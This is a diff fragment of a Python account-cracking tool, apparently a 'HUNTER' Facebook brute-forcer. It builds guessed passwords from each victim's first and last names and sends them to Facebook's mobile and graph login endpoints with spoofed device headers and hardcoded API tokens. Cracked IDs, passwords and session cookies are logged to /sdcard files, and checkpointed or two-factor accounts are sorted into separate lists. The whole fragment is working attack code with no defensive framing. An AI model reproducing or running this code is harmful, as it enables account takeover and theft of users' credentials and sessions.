+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"22120RN86G"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': S1(),}
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m [HUNTER-OK] '+ids+' | '+ps)                
+                print('\033[1;37m [🍪] Cookies :- '+coki)                
+                open('/sdcard/HUNTER-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f'\r\r\033[1;34m [HUNTER-LK] '+ids+' | '+ps+'\033[1;97m')
+                cps.append(cid)
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print(f'\r\r\033[1;33m [HUNTER-CP] '+ids+' | '+ps+'\033[1;97m')
+                open('/sdcard/HUNTER-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
+                cps.append(cid)
+            elif twf in session.cookies.get_dict().keys():
+                print('\033[1;93m\033[0;34mHUNTER-2F '+ids+' • '+ps+'  \033[0;97m')
+                break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+
+
+
+def newidx(ids,names,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			head = {"User-Agent": S1(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
+			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])
+				print('\r\r\033[1;32m [HUNTER-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				print('\033[1;37m [🍪] Cookies :- '+cookies)
+				open('/sdcard/HUNTER-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				oks.append(uid)
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = str(po['error']['error_data']['uid'])
+				print(f'\r\r\033[1;33m [HUNTER-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/HUNTER-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+menu()
